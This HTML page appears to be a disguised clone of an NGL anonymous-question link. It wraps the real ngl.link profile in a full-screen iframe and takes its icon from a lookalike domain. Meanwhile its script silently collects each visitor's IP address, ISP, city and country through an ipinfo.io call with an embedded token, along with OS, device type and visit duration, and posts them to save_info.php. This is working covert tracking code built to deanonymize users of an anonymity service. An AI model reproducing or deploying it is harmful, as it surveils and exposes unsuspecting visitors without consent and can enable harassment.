<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link rel="icon" href="https://ngl-link.rf.gd/wp-content/uploads/2024/09/ngl-logo.png">
    <title>@username</title>
    <script>
        let entryTime;

        // Capture the entry time when the page loads
        window.onload = function() {
            entryTime = new Date().toISOString(); // Current time in ISO format
            getVisitorInfo();
        }

        // Capture exit time and calculate duration when the user leaves
        window.onbeforeunload = function() {
            const exitTime = new Date().toISOString(); // Capture the exit time
            const duration = Math.floor((new Date() - new Date(entryTime)) / 1000); // Duration in seconds
            sendExitData(exitTime, duration);
        };

        // Fetch IP, location, and ISP information using ipinfo.io
        async function getVisitorInfo() {
            try {
                const response = await fetch('https://ipinfo.io/json?token=4fde51687e1e80'); // Replace YOUR_TOKEN with your actual token
                const data = await response.json();

                const visitorData = {
                    ip: data.ip,
                    isp: data.org, // Using org for ISP info
                    location: `${data.city}, ${data.region}, ${data.country}`, // Location
                    os: getOS(navigator.userAgent),
                    device: getDevice(navigator.userAgent),
                    entry_time: entryTime
                };

                // Send data to save_info.php via POST
                await fetch('save_info.php', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(visitorData)
                });
            } catch (error) {
                console.error('Error fetching visitor info:', error);
            }
        }

        // Function to detect OS from User-Agent string
        function getOS(userAgent) {
            if (userAgent.includes("Windows")) return "Windows";
            if (userAgent.includes("Mac")) return "MacOS";
            if (userAgent.includes("Linux")) return "Linux";
            if (userAgent.includes("Android")) return "Android";
            if (userAgent.includes("iPhone") || userAgent.includes("iPad")) return "iOS";
            return "Unknown";
        }

        // Function to detect device type from User-Agent string
        function getDevice(userAgent) {
            if (userAgent.includes("Mobile")) return "Mobile";
            if (userAgent.includes("Tablet")) return "Tablet";
            return "Desktop";
        }

        // Function to send exit time and duration to save_info.php via POST
        function sendExitData(exitTime, duration) {
            const exitData = { exit_time: exitTime, duration: duration };

            fetch('save_info.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(exitData)
            }).catch(error => {
                console.error('Error sending exit data:', error);
            });
        }
    </script>
</head>
<body>
    <iframe id="content-iframe" src="https://ngl.link/username1234"></iframe><!-- Add the ngl link here -->
    <style>
        /* Remove margin and padding from the body */
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden; /* Prevent scrolling */
        }

        /* Ensure the iframe covers the entire screen */
        iframe {
            width: 100vw;  /* 100% of viewport width */
            height: 100vh; /* 100% of viewport height */
            border: none;  /* Remove the default border */
            display: block; /* Remove inline iframe spacing */
        }
    </style>
</body>
</html>